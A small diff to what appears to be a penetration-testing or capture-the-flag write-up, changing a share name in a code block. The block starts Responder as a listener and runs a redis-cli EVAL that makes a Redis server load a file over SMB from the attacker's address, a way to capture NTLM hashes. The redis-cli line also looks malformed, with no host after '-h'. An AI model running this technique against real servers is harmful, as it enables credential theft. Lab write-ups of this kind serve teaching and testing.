@@ -91,7 +91,7 @@ we first set up a listener using `Impacket's Responder.py`.
 sudo responder -i tun0
 
 # request for a fake share.
-redis-cli -h EVAL "dofile('//10.18.88.214/noraj')" 0
+redis-cli -h EVAL "dofile('//10.18.88.214/fakeshare')" 0
 ```
 {% endcode %}
 
